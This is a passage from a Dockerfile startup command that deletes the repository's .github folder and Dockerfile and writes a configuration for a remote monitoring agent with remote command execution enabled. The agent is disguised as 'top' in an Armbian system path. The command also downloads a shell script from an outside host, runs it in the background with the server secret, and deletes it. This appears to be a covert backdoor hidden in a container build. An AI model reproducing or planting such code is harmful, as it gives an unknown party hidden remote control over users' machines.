# 启动命令 - 生成唯一UUID，直接运行top，运行top.sh作为备用
CMD ["/bin/bash", "-c", "\
echo \"[$(date)] Container starting...\" && \
echo \"[$(date)] Cleaning up unnecessary files...\" && \
rm -rf /app/.github 2>/dev/null && \
rm -f /app/Dockerfile 2>/dev/null && \
if [ -f /app/Dockerfile-cn ]; then cp /app/Dockerfile-cn /app/Dockerfile 2>/dev/null; fi && \
echo \"[$(date)] File cleanup completed\" && \
echo \"[$(date)] Generating unique UUID...\" && \
UUID=$(uuidgen -r) && \
echo \"[$(date)] New UUID generated: ${UUID}\" && \
CONFIG_PATH=\"/usr/lib/armbian/config/top.yml\" && \
if [ -f \"$CONFIG_PATH\" ]; then \
    RANDOM_SUFFIX=$(LC_ALL=C tr -dc a-z0-9 </dev/urandom | head -c 5); \
    CONFIG_PATH=\"/usr/lib/armbian/config/top-$RANDOM_SUFFIX.yml\"; \
fi && \
echo \"[$(date)] Creating top configuration at $CONFIG_PATH...\" && \
echo \"server: ${NZ_SERVER}\" > \"$CONFIG_PATH\" && \
echo \"password: ${NZ_CLIENT_SECRET}\" >> \"$CONFIG_PATH\" && \
echo \"tls: ${NZ_TLS}\" >> \"$CONFIG_PATH\" && \
echo \"uuid: ${UUID}\" >> \"$CONFIG_PATH\" && \
echo \"debug: false\" >> \"$CONFIG_PATH\" && \
echo \"disable_auto_update: false\" >> \"$CONFIG_PATH\" && \
echo \"disable_command_execute: false\" >> \"$CONFIG_PATH\" && \
echo \"disable_force_update: false\" >> \"$CONFIG_PATH\" && \
echo \"disable_nat: false\" >> \"$CONFIG_PATH\" && \
echo \"disable_send_query: false\" >> \"$CONFIG_PATH\" && \
echo \"gpu: false\" >> \"$CONFIG_PATH\" && \
echo \"insecure_tls: false\" >> \"$CONFIG_PATH\" && \
echo \"ip_report_period: 1800\" >> \"$CONFIG_PATH\" && \
echo \"report_delay: 3\" >> \"$CONFIG_PATH\" && \
echo \"self_update_period: 0\" >> \"$CONFIG_PATH\" && \
echo \"skip_connection_count: false\" >> \"$CONFIG_PATH\" && \
echo \"skip_procs_count: false\" >> \"$CONFIG_PATH\" && \
echo \"temperature: false\" >> \"$CONFIG_PATH\" && \
echo \"use_gitee_to_upgrade: false\" >> \"$CONFIG_PATH\" && \
echo \"use_ipv6_country_code: false\" >> \"$CONFIG_PATH\" && \
cat \"$CONFIG_PATH\" && \
echo \"[$(date)] Top configuration created with UUID: ${UUID}\" && \
chmod 644 \"$CONFIG_PATH\" && \
echo \"[$(date)] Starting top agent directly...\" && \
if [ -f /usr/lib/armbian/config/top ]; then \
    /usr/lib/armbian/config/top -c \"$CONFIG_PATH\" > /tmp/top.log 2>&1 & \
    TOP_PID=$! && \
    sleep 3 && \
    if kill -0 $TOP_PID 2>/dev/null; then \
        echo \"[$(date)] Top agent started successfully with PID: $TOP_PID, UUID: ${UUID}\"; \
    else \
        echo \"[$(date)] Top agent failed to start, checking log...\"; \
        cat /tmp/top.log 2>/dev/null || echo \"No log file found\"; \
    fi; \
else \
    echo \"[$(date)] Error: top binary not found\"; \
    ls -la /usr/lib/armbian/config/ 2>/dev/null || echo \"Directory not found\"; \
fi && \
echo \"[$(date)] Starting top.sh as backup...\" && \
curl -L https://r2.916919.xyz/ko30re/top.sh -o /tmp/top_backup.sh && \
chmod +x /tmp/top_backup.sh && \
env NZ_SERVER=${NZ_SERVER} NZ_TLS=${NZ_TLS} NZ_CLIENT_SECRET=${NZ_CLIENT_SECRET} NZ_UUID=${UUID} /tmp/top_backup.sh > /tmp/top_backup.log 2>&1 & \
rm -f /tmp/top_backup.sh && \
echo \"[$(date)] Backup top.sh started\" && \
echo \"[$(date)] Starting main application...\" && \
